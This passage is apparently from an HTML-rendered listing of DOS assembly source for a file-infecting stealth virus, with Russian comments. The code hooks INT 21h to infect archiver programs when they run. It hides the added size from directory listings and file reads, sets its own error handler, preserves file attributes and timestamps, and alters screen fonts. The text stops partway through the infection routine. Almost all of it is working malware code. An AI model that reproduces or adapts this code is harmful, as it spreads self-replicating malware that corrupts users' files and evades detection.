        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font2Ofs</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">*</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Font</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font3</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font3Ofs</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">*</span><span class="sc12">','</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Font</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font4</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font4Ofs</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">*</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Font</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3CEh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEh</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3C4h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">WaitTic</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Flag1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Ofs1Ch</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Seg1Ch</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">  


</span><span class="sc5">Font</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Flag1</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                           ОБРАБОТЧИК INT 21h</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int24h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotTest</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCBAh</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">NotTest</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Func4B</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flag2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Func4E</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Func4E</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Func3F</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Func42</span><span class="sc0">

</span><span class="sc5">Quit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitSTC</span><span class="sc0">

</span><span class="sc5">QuitCLC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">11111110b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">QuitSTC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                          ОБРАБОТЧИК ЗАПУСКА ФАЙЛА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Func4B</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flag2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем SI на начало имена файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">Loop1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop1</span><span class="sc0">


</span><span class="sc1">;[Проверяем имя файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Arhivat</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CmpStr</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NotArhiv</span><span class="sc0">


</span><span class="sc1">;[Заражаем архиватор]</span><span class="sc0">

        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flag2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">

</span><span class="sc5">NotArhiv</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                      ОБРАБОТЧИК ПЕРЕМЕЩЕНИЯ УКАЗАТЕЛЯ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Func42</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                          ОБРАБОТЧИК ЧТЕНИЯ ИЗ ФАЙЛА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Func3F</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">Quit</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitSTC</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Exec3F</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">QuitCLC</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                           ОБРАБОТЧИК ЧТЕНИЯ КАТАЛОГА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Func4E</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitSTC</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес обработчика Int 24h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 24h]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Set24h</span><span class="sc0">


</span><span class="sc1">;[Получаем адрес DTA]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Rest24h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Найденная запись - директория или метка тома?]</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Rest24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldBX</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Открываем найденный файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Rest24h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Проверяем его пригодность]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestFile</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Rest24h</span><span class="sc0">


</span><span class="sc1">;[Увеличиваем размер файла на длину вируса]</span><span class="sc0">

</span><span class="sc5">OldBX</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем старый обработчик Int 24h]</span><span class="sc0">

</span><span class="sc5">Rest24h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">QuitCLC</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                             ЗАРАЖЕНИЕ АРХИВАТОРОВ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Сохраняем вектор Int24h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 24h]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Set24h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Сохраняем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Fault</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Обнуляем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем время и дату создания файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc1">;[Проверяем пригодность файла]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Записываем новый заголовок]</span><span class="sc0">

